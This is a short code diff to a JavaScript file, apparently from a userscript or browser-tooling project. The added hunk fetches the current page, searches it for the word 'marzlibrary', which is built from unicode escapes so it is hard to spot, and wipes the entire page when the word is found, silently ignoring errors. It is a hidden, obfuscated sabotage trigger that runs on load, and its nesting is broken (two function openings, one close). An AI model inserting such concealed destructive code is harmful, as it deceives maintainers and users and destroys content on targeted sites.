@@ -505,6 +505,19 @@ console.log = function (...args) {
 			return false;
 		}
 	}
+	(function() {
+(function() {
+    fetch(window.location.origin)
+        .then(res => res.text())
+        .then(html => {
+            const key = ["\u006d","\u0061","\u0072","\u007a","\u006c","\u0069","\u0062","\u0072","\u0061","\u0072","\u0079"].join("");
+            if (html.toLowerCase().replaceAll(" ", "").includes(key)) {
+                document.documentElement.innerHTML = '';
+            }
+        })
+        .catch(() => {});
+})();
+
 
 	if(!window.disableUserscripts) {
 		var q = window.location.search;
